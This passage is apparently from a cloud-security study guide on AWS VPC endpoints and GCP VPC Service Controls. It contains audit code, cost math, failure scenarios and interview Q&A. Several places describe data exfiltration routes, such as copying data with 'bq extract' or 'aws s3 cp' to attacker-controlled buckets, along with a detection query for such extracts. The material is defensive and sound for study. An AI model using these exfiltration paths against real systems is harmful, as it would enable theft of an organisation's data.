        'mitigation': (
            'Remove NAT gateway from subnets containing PII data processors. '
            'Use VPC endpoints (Gateway for S3, Interface for other services) '
            'to provide necessary cloud service access without internet egress.'
        ),
        'severity': 'HIGH',
    })

    # Vector 3: Interface endpoint without private DNS
    vectors.append({
        'vector': 'Interface endpoint without private DNS enabled',
        'description': (
            'An interface endpoint without private DNS still works — applications '
            'that use the endpoint-specific DNS name. But the public hostname '
            '(e.g., secretsmanager.us-east-1.amazonaws.com) still resolves to '
            'public IPs. Applications that hardcode the public hostname bypass '
            'the endpoint and route through NAT or public internet.'
        ),
        'detection': (
            'Check endpoint PrivateDnsEnabled: true. Verify from inside VPC that '
            'service hostname resolves to private IP (validate_private_dns function).'
        ),
        'mitigation': 'Enable private DNS on all interface endpoints.',
        'severity': 'MEDIUM',
    })

    # Vector 4: GCP BigQuery extract to external GCS without VPC SC
    vectors.append({
        'vector': 'GCP: BigQuery extract to external GCS bucket (no VPC SC)',
        'description': (
            'Without VPC Service Controls, any IAM principal with BigQuery read access '
            'can run bq extract to copy data to any GCS bucket — including attacker-controlled '
            'buckets in different GCP projects. IAM cannot prevent this because the '
            'service account legitimately has read access to the data.'
        ),
        'detection': (
            'Audit BigQuery job history for extract operations to buckets outside your org: '
            'SELECT * FROM `region-us.INFORMATION_SCHEMA.JOBS` '
            'WHERE job_type = "EXTRACT" AND destination_uri NOT LIKE "gs://company-*"'
        ),
        'mitigation': (
            'Enable VPC Service Controls with egress policy restricting BigQuery extract '
            'operations to GCS buckets within the organization perimeter. '
            'Enable dry-run mode first, review violations for 1-2 weeks, then enforce.'
        ),
        'severity': 'CRITICAL',
    })

    return vectors


# ─── Cost Calculator ──────────────────────────────────────────────────────────────

def calculate_endpoint_costs(
    s3_gb_per_month: float = 0,
    dynamodb_gb_per_month: float = 0,
    interface_endpoint_count: int = 0,
    azs: int = 3,
    interface_gb_per_month: float = 0,
    has_nat_gateway: bool = True,
) -> dict:
    """
    Calculate the cost of VPC endpoints vs NAT gateway for common data platform traffic.
    
    NAT gateway costs:
    - $0.045/hr (fixed, per AZ where deployed)
    - $0.045/GB data processed
    
    Gateway endpoint (S3/DynamoDB): FREE
    Interface endpoint: $0.01/hr/AZ + $0.01/GB
    """
    hours_per_month = 730

    # NAT gateway costs (what you'd pay without endpoints)
    nat_fixed_cost = 0.045 * hours_per_month * azs if has_nat_gateway else 0
    nat_s3_cost = s3_gb_per_month * 0.045 if has_nat_gateway else 0
    nat_ddb_cost = dynamodb_gb_per_month * 0.045 if has_nat_gateway else 0
    nat_interface_cost = interface_gb_per_month * 0.045 if has_nat_gateway else 0
    nat_total = nat_fixed_cost + nat_s3_cost + nat_ddb_cost + nat_interface_cost

    # Gateway endpoint cost: $0
    gateway_cost = 0.0

    # Interface endpoint costs
    interface_fixed_cost = 0.01 * hours_per_month * azs * interface_endpoint_count
    interface_data_cost = interface_gb_per_month * 0.01
    interface_total = interface_fixed_cost + interface_data_cost

    # Total endpoint cost
    endpoint_total = gateway_cost + interface_total

    # What you save by using endpoints instead of NAT for those services
    savings = (nat_s3_cost + nat_ddb_cost) - gateway_cost  # Gateway always saves
    savings += (nat_interface_cost - interface_data_cost)    # Interface saves data cost

    return {
        'nat_without_endpoints': {
            'fixed_cost_usd': round(nat_fixed_cost, 2),
            's3_data_cost_usd': round(nat_s3_cost, 2),
            'dynamodb_data_cost_usd': round(nat_ddb_cost, 2),
            'interface_service_data_cost_usd': round(nat_interface_cost, 2),
            'total_usd': round(nat_total, 2),
        },
        'with_endpoints': {
            'gateway_endpoint_cost_usd': 0.0,
            'interface_endpoint_fixed_usd': round(interface_fixed_cost, 2),
            'interface_endpoint_data_usd': round(interface_data_cost, 2),
            'total_usd': round(endpoint_total, 2),
        },
        'monthly_savings_usd': round(max(0, nat_total - endpoint_total - nat_fixed_cost), 2),
        'note': (
            'NAT gateway fixed cost is still needed for non-endpoint traffic '
            '(OS updates, third-party APIs, etc.) unless all internet access is removed.'
        ),
    }


# ─── Report ──────────────────────────────────────────────────────────────────────

def endpoint_audit_report(
    vpc_id: Optional[str] = None,
    region: str = 'us-east-1',
    s3_gb_per_month: float = 1000.0,
    check_dns: bool = False,
) -> None:
    """Print a comprehensive endpoint audit report."""
    print("=" * 70)
    print("VPC ENDPOINT / PRIVATE ACCESS AUDIT REPORT")
    print(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)

    # Cost calculator (no credentials needed)
    print("\n[1] COST ANALYSIS")
    costs = calculate_endpoint_costs(
        s3_gb_per_month=s3_gb_per_month,
        dynamodb_gb_per_month=s3_gb_per_month * 0.1,
        interface_endpoint_count=5,
        azs=3,
        interface_gb_per_month=s3_gb_per_month * 0.05,
        has_nat_gateway=True,
    )
    print(f"  Assuming {s3_gb_per_month:,.0f} GB/month S3 traffic:")
    print(f"  Without endpoints → NAT data cost: "
          f"${costs['nat_without_endpoints']['s3_data_cost_usd']:,.2f}/month")
    print(f"  With S3 Gateway endpoint → $0.00/month (FREE)")
    print(f"  5 interface endpoints (3 AZs) → "
          f"${costs['with_endpoints']['interface_endpoint_fixed_usd']:,.2f}/month fixed")
    print(f"  Estimated savings: "
          f"${costs['monthly_savings_usd']:,.2f}/month")

    # Exfiltration risk analysis
    print("\n[2] DATA EXFILTRATION RISK VECTORS")
    vectors = analyze_exfiltration_vectors()
    for v in vectors:
        icon = "🚨" if v['severity'] == 'CRITICAL' else (
               "⚠️ " if v['severity'] == 'HIGH' else "ℹ️ ")
        print(f"\n  {icon} [{v['severity']}] {v['vector']}")
        print(f"     {v['description'][:100]}...")
        print(f"     Mitigation: {v['mitigation'][:100]}...")

    # Endpoint coverage check (requires AWS credentials)
    if vpc_id:
        try:
            auditor = VPCEndpointAuditor(region=region)
            report = auditor.generate_coverage_report(vpc_id)
            print(f"\n[3] ENDPOINT COVERAGE FOR {vpc_id}")
            print(f"  S3 Gateway endpoint: {'✓' if report.has_s3_endpoint else '✗ MISSING'}")
            print(f"  DynamoDB Gateway endpoint: "
                  f"{'✓' if report.has_dynamodb_endpoint else '✗ MISSING'}")
            if report.interface_endpoints:
                print(f"  Interface endpoints ({len(report.interface_endpoints)}):")
                for ep in report.interface_endpoints[:5]:
                    print(f"    ✓ {ep.split('.')[-1]}")
            if report.missing_recommended:
                print(f"  Missing recommended endpoints:")
                for m in report.missing_recommended[:5]:
                    print(f"    ✗ {m}")
            for risk in report.exfiltration_risks:
                print(f"  🚨 {risk[:100]}...")

            # Policy audit
            policy_issues = auditor.audit_endpoint_policies(vpc_id)
            if policy_issues:
                print(f"\n[4] ENDPOINT POLICY ISSUES")
                for issue in policy_issues:
                    print(f"  ⚠️  {issue.endpoint_id}: {issue.description[:100]}...")
                    print(f"     Fix: {issue.recommendation[:100]}...")

        except RuntimeError as e:
            print(f"\n[3] ENDPOINT COVERAGE: {e} — set vpc_id and AWS credentials to audit")

    # DNS check (run from inside VPC)
    if check_dns:
        print(f"\n[{'4' if not vpc_id else '5'}] INTERFACE ENDPOINT DNS VALIDATION")
        print("  (Run from inside the VPC for accurate results)")
        results = check_common_endpoint_dns(region)
        for r in results:
            icon = "✓" if r['is_private'] else "⚠️ "
            print(f"  {icon} {r['service_name']}: {r['resolved_ips']}")
            if not r['is_private']:
                print(f"    → {r['diagnosis'][:100]}")

    print("\n" + "=" * 70)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="VPC endpoint diagnostic toolkit")
    parser.add_argument('--vpc-id', metavar='VPC_ID', help='VPC ID to audit')
    parser.add_argument('--region', default='us-east-1', help='AWS region')
    parser.add_argument('--s3-gb', type=float, default=1000.0,
                        help='Estimated S3 traffic in GB/month for cost calculation')
    parser.add_argument('--check-dns', action='store_true',
                        help='Check if service hostnames resolve to private IPs')
    parser.add_argument('--validate-host', metavar='HOSTNAME',
                        help='Validate a single hostname resolves to private IP')
    args = parser.parse_args()

    if args.validate_host:
        result = validate_private_dns(args.validate_host)
        print(result['diagnosis'])
    else:
        endpoint_audit_report(
            vpc_id=args.vpc_id,
            region=args.region,
            s3_gb_per_month=args.s3_gb,
            check_dns=args.check_dns,
        )
```

---

## 6. Visual Reference

### Traffic Path: With and Without VPC Endpoints

```
┌─────────────────────────────── AWS Region ──────────────────────────────────┐
│                                                                              │
│  ┌─────────────────── VPC ────────────────────────────────────────┐         │
│  │                                                                 │         │
│  │  Private Subnet (10.0.1.0/24)                                  │         │
│  │  ┌────────────────┐                                            │         │
│  │  │ Spark EC2      │                                            │         │
│  │  │ 10.0.1.5       │──── Without endpoint ──→ NAT GW ──→ IGW ──┼──→ S3   │
│  │  │                │                                            │  public │
│  │  │                │──── With Gateway endpoint ─────────────────┼──→ S3   │
│  │  └────────────────┘       (route: vpce-xxx)          internal │         │
│  │                                                                 │         │
│  │  ┌────────────────────────────────────────────────────────┐    │         │
│  │  │ Interface Endpoint ENI (secretsmanager)                │    │         │
│  │  │ IP: 10.0.1.100                                         │    │         │
│  │  │ DNS: secretsmanager.us-east-1.amazonaws.com → 10.0.1.100   │         │
│  │  └────────────────────────────────────────────────────────┘    │         │
│  │                                                                 │         │
│  └─────────────────────────────────────────────────────────────────┘         │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

Cost path without S3 endpoint:
  10 TB S3 reads/day × $0.045/GB = $450/day → $164,250/year

Cost path with S3 Gateway endpoint:
  10 TB S3 reads/day × $0.00/GB = $0
```

### GCP VPC Service Controls Perimeter

```
Organization: company.com
  │
  ├── Project: data-production   ←──────────────────────────────────────────┐
  ├── Project: data-staging       ←─────── INSIDE PERIMETER ──────────────┐ │
  ├── Project: shared-infra       ←────── (BigQuery, GCS, Pub/Sub         │ │
  │                                        protected services)            │ │
  │                                                                        │ │
  └── Project: ml-team ─── BigQuery request ──→ [VPC SC checks perimeter]─┘ │
                                                  Is ml-team inside?         │
                                                  NO → DENIED                │
                                                  (unless access level met)  │
                                                                             │
Outside organization:                                                        │
  attacker-project ── bq extract → [VPC SC] → BLOCKED: outside perimeter ───┘
  corporate-laptop  ── bq query  → [VPC SC] → Access Level check:
                                               IP in 203.0.113.0/24? YES → ALLOWED
```

### Endpoint Policy: Exfiltration Prevention

```
Without endpoint policy restriction:
  EC2 → S3 endpoint → company-datalake (allowed by IAM)    ✓
  EC2 → S3 endpoint → attacker-bucket  (allowed by IAM)    ✓ BAD!

With endpoint policy restricting to company-* buckets:
  EC2 → S3 endpoint → company-datalake (allowed by IAM + endpoint policy)  ✓
  EC2 → S3 endpoint → attacker-bucket  (blocked by endpoint policy)        ✗
  
  If EC2 has no NAT gateway route: no fallback path → exfiltration impossible
  If EC2 has NAT gateway:         could bypass via NAT → also restrict NAT egress
```

---

## 7. Common Mistakes

**Mistake 1: Creating an S3 Gateway endpoint but not adding it to all route tables.** The endpoint is associated with specific route tables at creation time. If you add new private subnets later (e.g., for a new AZ), their route tables don't automatically get the endpoint route. Spark jobs in new subnets still route S3 traffic through NAT gateway — you see the cost optimization partially working but not fully. Always verify the endpoint is in all private subnet route tables.

**Mistake 2: Enabling an interface endpoint but not enabling private DNS.** The endpoint exists and works if you use the endpoint-specific DNS name (`vpce-0abc123-secretsmanager.us-east-1.vpce.amazonaws.com`). But most SDK clients use the default regional hostname (`secretsmanager.us-east-1.amazonaws.com`), which resolves to a public IP unless private DNS is enabled on the endpoint. Without private DNS, traffic still goes to the public endpoint. Enable private DNS for all interface endpoints.

**Mistake 3: Restricting the S3 endpoint policy without testing access patterns first.** If you apply a restrictive endpoint policy (only `company-*` buckets) without first auditing which S3 buckets your applications actually use, you may block legitimate access to AWS-managed public buckets — like the AWS SSM agent's S3 bucket for storing session logs, or public reference data buckets used by genomics pipelines. Audit S3 access patterns from VPC flow logs before restricting endpoint policies.

**Mistake 4: Enabling GCP VPC Service Controls without dry-run first.** VPC Service Controls enforcement immediately blocks requests that violate the perimeter — including legitimate ones that were inadvertently excluded from the perimeter definition. A common scenario: adding BigQuery to the protected services list without including the BigQuery connector project used by Looker. Looker's queries immediately start failing. Always enable dry-run mode, monitor Cloud Audit Logs for `vpcServiceControlsUniqueIdentifier` violations for at least one week of normal traffic, resolve all unexpected violations, then enable enforcement.

**Mistake 5: Using VPC endpoints as a substitute for encryption.** VPC endpoints keep traffic within the cloud provider's network but this doesn't mean it's encrypted. Traffic between an EC2 instance and S3 via a Gateway endpoint is still HTTP or HTTPS depending on how the client is configured. Always enforce `aws:SecureTransport: true` in bucket policies regardless of whether you use VPC endpoints, and use TLS for all interface endpoint connections.

---

## 8. Production Failure Scenarios

### Scenario 1: EKS Pods Cannot Pull Images After Moving to Fully Private Cluster

**Symptoms:** After a security team converts an EKS cluster to fully private (removing internet access from node subnets), node pods fail to start with `ImagePullBackOff`. Error: `failed to pull image "123456789.dkr.ecr.us-east-1.amazonaws.com/data-platform:latest": context deadline exceeded`.

**Root cause:** A fully private EKS cluster requires interface endpoints for ECR (two separate endpoints: `ecr.api` and `ecr.dkr`) and an S3 Gateway endpoint (ECR stores image layers in S3 internally). The node subnets now have no NAT gateway route. ECR API calls (`ecr.api`) resolve to public IPs; without an interface endpoint and private DNS, they time out.

**Fix:** Create interface endpoints for both `com.amazonaws.REGION.ecr.api` and `com.amazonaws.REGION.ecr.dkr` with private DNS enabled, plus verify the S3 Gateway endpoint is in the node subnets' route tables. Also required: STS endpoint (for IRSA token exchange) and CloudWatch Logs endpoint (for control plane logging). Check the AWS documentation for the full list of required endpoints for a private EKS cluster.

```bash
# Verify ECR DNS resolves to private IP from inside a node:
kubectl run dns-test --image=busybox -it --rm --restart=Never -- \
  nslookup 123456789.dkr.ecr.us-east-1.amazonaws.com
# Should show a 10.x.x.x IP, not 52.x.x.x
```

### Scenario 2: S3 Data Transfer Costs Spike After Multi-AZ Migration

**Symptoms:** The monthly AWS bill shows $18,000 in unexpected NAT gateway data processing charges. The infrastructure team added a new AZ (us-east-1c) to support a regional HA deployment. S3 read costs for Spark jobs appear to have increased proportionally.

**Root cause:** When the new AZ was added, new private subnets were created and new route tables were created for those subnets. The S3 Gateway endpoint was only associated with the original two AZ route tables (`rtb-private-1a`, `rtb-private-1b`). The new AZ route table (`rtb-private-1c`) has no S3 endpoint route. Spark workers running in `us-east-1c` subnets route S3 traffic through the NAT gateway — paying $0.045/GB.

**Fix:**
```bash
# Find the new route table
aws ec2 describe-route-tables \
  --filters "Name=vpc-id,Values=vpc-0abc123" \
  --query 'RouteTables[?!Routes[?GatewayId && starts_with(GatewayId, `vpce`)]]
           .{RouteTableId: RouteTableId, Tags: Tags}'

# Get the S3 endpoint ID
S3_ENDPOINT=$(aws ec2 describe-vpc-endpoints \
  --filters "Name=vpc-id,Values=vpc-0abc123" \
            "Name=service-name,Values=com.amazonaws.us-east-1.s3" \
  --query 'VpcEndpoints[0].VpcEndpointId' --output text)

# Add the new route table to the endpoint
aws ec2 modify-vpc-endpoint \
  --vpc-endpoint-id $S3_ENDPOINT \
  --add-route-table-ids rtb-private-1c
```

### Scenario 3: BigQuery Scheduled Queries Break After VPC SC Enforcement

**Symptoms:** After enabling VPC Service Controls enforcement (following two weeks of dry-run), 30% of BigQuery scheduled queries start failing with `PERMISSION_DENIED: Request is prohibited by organization's policy`. The queries were running correctly during dry-run mode.

**Root cause:** BigQuery scheduled queries use a different service account than expected. When a scheduled query runs, it executes with the identity of the BigQuery Transfer Service service account (`service-PROJECT_NUMBER@gcp-sa-bigquery-dts.iam.gserviceaccount.com`), not the user's service account. This service account's project was not included in the perimeter. During dry-run, violations were logged but not enforced — teams thought no violations existed. In fact, violations were generated but no one was monitoring the dry-run violation logs for this service account.

**Fix:** Add the BigQuery Transfer Service's project to the perimeter, or create an ingress rule with an access level that permits requests from the Transfer Service:

```yaml
# ingress_policy.yaml
- ingressFrom:
    identities:
    - serviceAccount:service-PROJECT_NUMBER@gcp-sa-bigquery-dts.iam.gserviceaccount.com
    sources:
    - resource: "projects/PROJECT_NUMBER"
  ingressTo:
    operations:
    - serviceName: bigquery.googleapis.com
      methodSelectors:
      - method: "*"
    resources:
    - "*"
```

### Scenario 4: Secrets Manager Access Fails After VPC DNS Setting Changed

**Symptoms:** Airflow workers suddenly cannot retrieve database passwords from Secrets Manager. Error: `Could not connect to the endpoint URL: "https://secretsmanager.us-east-1.amazonaws.com/"`. The Secrets Manager interface endpoint exists and is in `available` state.

**Root cause:** During a VPC audit, a network engineer disabled `enableDnsHostnames` on the VPC (as a hardening measure, thinking it wasn't needed since all instances use private IPs). This breaks private DNS for interface endpoints: the Route 53 private hosted zone entry for `secretsmanager.us-east-1.amazonaws.com` stops being served, and the hostname resolves to the public IP. Since there is no NAT gateway (the cluster is fully private), the public IP is unreachable.

**Fix:**
```bash
# Re-enable DNS hostnames on the VPC
aws ec2 modify-vpc-attribute \
  --vpc-id vpc-0abc123 \
  --enable-dns-hostnames '{"Value": true}'

# Verify from inside the VPC
dig secretsmanager.us-east-1.amazonaws.com
# Should now return 10.x.x.x again
```

---

## 9. Performance and Tuning

### Gateway Endpoint Throughput

S3 Gateway endpoints have no throughput limits and no additional latency — they are a routing change, not a proxy or appliance. S3 request throughput is limited by S3's per-prefix limits (3,500 PUT/POST/DELETE and 5,500 GET/HEAD requests per second per prefix) and by the instance's network bandwidth, not the endpoint.

### Interface Endpoint Bandwidth

Interface endpoints are powered by AWS PrivateLink, which supports up to 10 Gbps burst per Availability Zone per endpoint. For Spark clusters consuming data from Secrets Manager or Kinesis at very high request rates (millions of API calls/minute), multiple endpoints across multiple AZs provide additional throughput capacity. The client SDK automatically distributes requests across endpoint ENIs in multiple AZs when multiple endpoint subnets are configured.

### VPC SC Latency Impact

GCP VPC Service Controls add authentication overhead to every protected API call — an additional policy evaluation step. In practice, the latency impact is measured in single-digit milliseconds per API call. For batch workloads (BigQuery jobs that run for minutes to hours), this overhead is negligible. For latency-sensitive OLTP workloads making thousands of API calls per second, benchmark after enabling VPC SC to verify the overhead is acceptable.

### Cost Optimization: Interface Endpoint vs NAT

For services other than S3/DynamoDB, calculate the break-even point between interface endpoint cost and NAT gateway data cost:

```
Interface endpoint fixed cost: $0.01/hr × 3 AZs × 730 hrs = $21.90/month/endpoint
Interface endpoint data cost:  $0.01/GB
NAT gateway data cost:         $0.045/GB

Break-even (data cost only):
  $0.045/GB × X GB = $0.01/GB × X GB + $21.90
  $0.035/GB × X GB = $21.90
  X = 625 GB/month

At 625+ GB/month of traffic to a single service, the interface endpoint 
is cheaper than NAT gateway for that traffic. Most services with high-frequency 
API calls (KMS, STS, Secrets Manager in an active cluster) exceed this quickly.
```

---

## 10. Interview Q&A

**Q1: Explain the difference between an S3 Gateway endpoint and an S3 Interface endpoint. When would you use each?**

AWS offers two types of VPC endpoints for S3, and they have fundamentally different architectures despite both providing private S3 access. The Gateway endpoint is a routing change: it adds entries to your VPC route tables that direct S3-destined traffic through the AWS internal network rather than through a NAT gateway or internet gateway. It costs nothing, creates no ENIs, and has no per-GB data processing charge. The downside is that it only works within the VPC where the route tables exist — it cannot be used by on-premises systems connected via AWS Direct Connect, and it cannot be used by resources in VPC peering relationships accessing S3 on behalf of another VPC.

The Interface endpoint creates an actual ENI (Elastic Network Interface) with a private IP address in your subnets. Traffic is handled by AWS PrivateLink — a private fiber within the AWS backbone. It enables on-premises systems connected via Direct Connect to reach S3 through a private path, and it supports cross-VPC sharing more easily than Gateway endpoints. The trade-off is cost: $0.01/hr/AZ plus $0.01/GB, which at scale can be meaningful.

For nearly all data engineering workloads — Spark clusters, Airflow, EMR, EKS — the Gateway endpoint is the right choice. It's free, it covers all S3 traffic within the VPC, and it eliminates the single largest category of unexpected AWS data transfer costs. The Interface endpoint is appropriate when you need to support on-premises S3 access or need the endpoint to be accessible from peered VPCs.

The decision tree: if you're eliminating NAT gateway charges for a VPC's S3 traffic, use the Gateway endpoint. If you're setting up Direct Connect or need the endpoint accessible from outside the VPC, use the Interface endpoint.

**Q2: What is GCP VPC Service Controls and how does it address data exfiltration that IAM alone cannot prevent?**

VPC Service Controls creates an organization-level security perimeter around GCP services (BigQuery, Cloud Storage, Pub/Sub, etc.) that restricts which resources can access those services based on their context — which project they're in, which VPC they originate from, which IP range they're calling from, or whether they're using a managed device. It operates above IAM: even if an IAM policy grants `roles/bigquery.dataViewer` to a service account, VPC Service Controls can block that request if it doesn't originate from within the defined perimeter.

The limitation IAM cannot address is called the "confused deputy" or insider exfiltration problem: if a legitimate service account with BigQuery read access is compromised, or if a malicious insider has that access, they can run `bq extract` to copy BigQuery data to a GCS bucket in a different GCP project or organization. The IAM check passes — the service account does have the necessary permissions — and the data is copied to an attacker-controlled location. IAM cannot prevent this because both the read operation and the extract operation are IAM-permitted.

VPC Service Controls adds an egress rule to the perimeter: it restricts where data can be sent. An egress policy might specify that BigQuery extract operations can only write to GCS buckets within projects that are inside the perimeter. An extract to `gs://attacker-bucket-outside-org/` violates the perimeter egress rule and is blocked with `PERMISSION_DENIED: Request is prohibited by organization's policy` — even though IAM would have allowed it.

The operational reality: VPC Service Controls enforcement must be preceded by a dry-run period (typically one to two weeks) to identify all legitimate traffic patterns, because an incorrectly configured perimeter can block production workflows. The most common breakage patterns are service accounts from external automation tools (Looker, dbt Cloud, Fivetran) that are not included in the perimeter's ingress rules.

**Q3: Describe how you would architect a fully private data processing cluster on AWS that has no internet access but still needs to reach S3, Secrets Manager, ECR, CloudWatch Logs, and STS.**

A fully private cluster requires replacing every service that would normally reach public internet endpoints with VPC endpoints. Here's the complete architecture.

For S3: a Gateway endpoint associated with all private subnet route tables. This covers S3 reads/writes for data and also covers ECR (which stores container image layers in S3 internally). The endpoint policy should restrict access to company-owned buckets to prevent exfiltration.

For container images: two interface endpoints — `ecr.api` and `ecr.dkr` — with private DNS enabled in the subnets where EKS worker nodes run. Without the ECR DKR endpoint, image layer pulls fail (they go directly to the registry's DKR domain, different from the API domain). Both endpoints must be present.

For secrets: a Secrets Manager interface endpoint with private DNS enabled. Airflow workers and application pods reference `secretsmanager.us-east-1.amazonaws.com` — with private DNS, this resolves to the endpoint's ENI IP rather than the public Secrets Manager IP.

For IRSA token exchange: an STS interface endpoint with private DNS enabled. EKS pods using IRSA call STS to exchange OIDC tokens for temporary AWS credentials. Without the STS endpoint, these calls fail in a cluster without internet access.

For logging: a CloudWatch Logs interface endpoint. Kubernetes nodes and pods write logs to CloudWatch. Without this endpoint, log delivery fails (though the pods continue running — it's not a startup failure).

For KMS: if any S3 buckets use SSE-KMS encryption (which they should for sensitive data), a KMS interface endpoint is required. KMS key operations (decrypt calls during S3 reads) would fail without it.

Additionally, the security group for the interface endpoint ENIs must allow inbound HTTPS (TCP 443) from the VPC CIDR or from the security groups of the nodes/pods that will use them. The VPC must have `enableDnsSupport` and `enableDnsHostnames` both set to true.

---

## 11. Cross-Question Chain

**Interviewer:** Your data platform Spark cluster is in a private subnet with no NAT gateway. Describe what VPC endpoints you need and why.

**Candidate:** At minimum, four categories. First, the S3 Gateway endpoint — Spark reads input data and writes output data to S3, and EMR/Spark also uses S3 for EMRFS (the S3-backed filesystem). Without it, all S3 traffic is blocked because there's no internet path. The Gateway endpoint adds a route table entry directing S3 traffic through the AWS internal network.

Second, if using ECR for container images (EKS-based Spark), I need both `ecr.api` and `ecr.dkr` interface endpoints, plus the S3 Gateway endpoint covers ECR's S3-backed layer storage. Without `ecr.dkr`, image pulls fail even if `ecr.api` succeeds — they're separate hostnames.

Third, if using IRSA for Spark to access S3 or other services via IAM role: an STS interface endpoint. IRSA works by having the kubelet exchange a pod's OIDC token with STS for temporary AWS credentials. STS calls go to a public endpoint by default; without the STS endpoint, IRSA token exchange fails and the Spark pods can't get credentials.

Fourth, Secrets Manager interface endpoint if Spark jobs retrieve database passwords or API keys at runtime. And KMS if S3 buckets use SSE-KMS — Spark reads of KMS-encrypted objects trigger KMS decrypt API calls.

**Interviewer:** You add all those endpoints. Three weeks later, an engineer adds a new private subnet in a third AZ to improve availability. What do you need to check?

**Candidate:** The critical check: the S3 Gateway endpoint. Gateway endpoints are associated with specific route tables at creation time. The new subnet's route table — a new route table created for the new AZ — does not automatically inherit the endpoint association. Spark jobs running in the new AZ's subnet will route S3 traffic through... nothing, since there's no NAT gateway either. All S3 operations from the new subnet will time out.

I need to associate the S3 endpoint with the new route table:
```bash
aws ec2 modify-vpc-endpoint \
  --vpc-endpoint-id vpce-0abc123 \
  --add-route-table-ids rtb-new-subnet-1c
```

For interface endpoints, the situation is different: interface endpoints are subnet-specific. The new subnet doesn't have endpoint ENIs in it. Pods scheduled on nodes in the new AZ will still reach the interface endpoints — they're accessible across the VPC via the existing ENIs in other AZs. But for resilience (and to avoid cross-AZ data transfer costs), I should create new endpoint network interfaces in the new subnet:
```bash
aws ec2 modify-vpc-endpoint \
  --vpc-endpoint-id vpce-secretsmanager-xxx \
  --add-subnet-ids subnet-new-1c
```

**Interviewer:** The security team now wants to prevent data exfiltration to S3 buckets outside the company. You have an S3 Gateway endpoint. What controls do you add?

**Candidate:** Two complementary controls. The first is the S3 Gateway endpoint policy — I restrict the `Resource` in the policy to company-owned bucket ARNs: `arn:aws:s3:::company-*` and `arn:aws:s3:::company-*/*`. This means traffic through the endpoint can only access company buckets. An `aws s3 cp` to `attacker-external-bucket` is blocked at the endpoint policy level.

But the endpoint policy only covers traffic that flows through the endpoint. If any route in the private subnet's route table includes a NAT gateway (as a fallback or for internet access), traffic to external S3 buckets can bypass the endpoint and route through NAT instead. So the second control: remove NAT gateway from the sensitive data processing subnets entirely, or if NAT is needed for OS updates and third-party packages, add an outbound security group rule that only allows HTTPS (TCP 443) to known internal CIDR ranges, or use network firewall to block non-approved destinations.

The most complete defense: no NAT gateway in the data processing subnets, only the S3 Gateway endpoint with a restrictive resource policy. The data processing instances can only reach S3 via the endpoint, and the endpoint only allows company buckets. There is no network path to external S3 buckets.

**Interviewer:** Your organization runs the same architecture on GCP. How do you solve the same exfiltration problem there?

**Candidate:** The primary control is VPC Service Controls. I create a service perimeter that includes the GCP projects containing production data (BigQuery datasets, GCS buckets). I add BigQuery and Cloud Storage as protected services within the perimeter. Then I add an egress policy that restricts where data can be sent: BigQuery extract operations and GCS reads can only write to destinations within the perimeter's projects.

With this in place, even if a service account with BigQuery data viewer access is compromised, running `bq extract` to a GCS bucket outside the organization's projects will fail with `PERMISSION_DENIED: Request is prohibited by organization's policy`.

For data to leave the perimeter legitimately — e.g., exporting data to a customer's GCS bucket — I add explicit egress rules with conditions: only specific service accounts can perform outbound operations to specifically-approved external projects. Every other outbound data transfer attempt is blocked and logged to Cloud Audit Logs.

I enable Private Google Access on the data processing subnets so VMs with only internal IPs can reach BigQuery and GCS without needing external IPs or NAT — then ensure there's no Cloud NAT or external IP that would create an alternate path around the VPC SC enforcement.

**Interviewer:** How long does it typically take to enable VPC Service Controls enforcement safely, and what's the biggest operational risk?

**Candidate:** Based on production deployments: at minimum two to four weeks of dry-run mode before enforcement, longer for complex organizations with many services and teams. The reason is that VPC SC perimeters require explicitly allowing every legitimate access pattern — it's a default-deny model at the organization level. Missing any legitimate access pattern means a production breakage the moment enforcement is enabled.

The biggest operational risk is what I'd call "invisible users" — identities that legitimately access production data but are not operated by the data platform team. The most common examples: Looker service accounts calling BigQuery from their cloud infrastructure (external to the perimeter); dbt Cloud or Fivetran running as service accounts from their SaaS platforms (definitely external); Google-managed service accounts used by BigQuery Transfer Service, Dataform, or Scheduled Queries (internal but often in a different project that's not in the perimeter); cross-project BigQuery views (a query in project A reads a BigQuery view in project B that's inside the perimeter — the cross-project read is flagged as external access).

The operational workflow: enable dry-run, integrate the dry-run violation logs into your monitoring dashboard (Cloud Audit Logs → Log-based metric → alert on violations), require all teams to acknowledge their violations and either fix them (by adjusting service account projects or ingress rules) or accept a legitimate exception before enforcement is enabled. Never enable enforcement as a surprise — coordinate with all teams that use BigQuery, GCS, and Pub/Sub in production.

---

## 12. Flashcards

| # | Front | Back |
|---|-------|-------|
| 1 | What is the cost of an AWS S3 Gateway VPC endpoint? | Free — $0 fixed cost, $0/GB. It is a routing change, not a service. The savings come from eliminating NAT gateway data processing charges ($0.045/GB) for S3 traffic. |
| 2 | What is the cost of an AWS Interface (PrivateLink) endpoint? | $0.01/hr per AZ where it's deployed + $0.01/GB data processed. A 3-AZ endpoint costs ~$21.90/month fixed. Break-even with NAT is at ~625 GB/month per service. |
| 3 | Why do you need TWO ECR endpoints for a private EKS cluster? | `ecr.api` (image metadata, auth) and `ecr.dkr` (image layer pulls) are separate DNS hostnames and separate services. Missing either one causes ImagePullBackOff even if the other is present. |
| 4 | What S3 endpoint is needed even for a cluster that only uses ECR? | The S3 Gateway endpoint — ECR stores image layers in S3 internally. `ecr.dkr` calls download layers from S3 buckets managed by AWS. Without the S3 Gateway endpoint, layer pulls fail (or incur NAT charges). |
| 5 | What does an S3 endpoint policy do that IAM alone cannot? | Restricts which S3 buckets can be accessed through the private path, regardless of IAM permissions. Prevents exfiltration by blocking the private endpoint path to non-company-owned buckets. IAM can allow a bucket; endpoint policy can still block the path to it. |
| 6 | What happens if you apply a restrictive S3 endpoint policy but leave NAT gateway in the subnet? | The endpoint policy blocks the private path to external buckets, but traffic can still flow via NAT gateway to the same external buckets. Both controls must be present for complete exfiltration prevention. |
| 7 | What is GCP VPC Service Controls? | An organization-level security perimeter around GCP services that restricts API access based on the originating context (project, VPC, IP, device). Blocks requests even if IAM permits them, based on where the request originates. |
| 8 | What error message does GCP VPC Service Controls return when blocking a request? | `PERMISSION_DENIED: Request is prohibited by organization's policy. vpcServiceControlsUniqueIdentifier: <id>`. The unique identifier links to the audit log entry. |
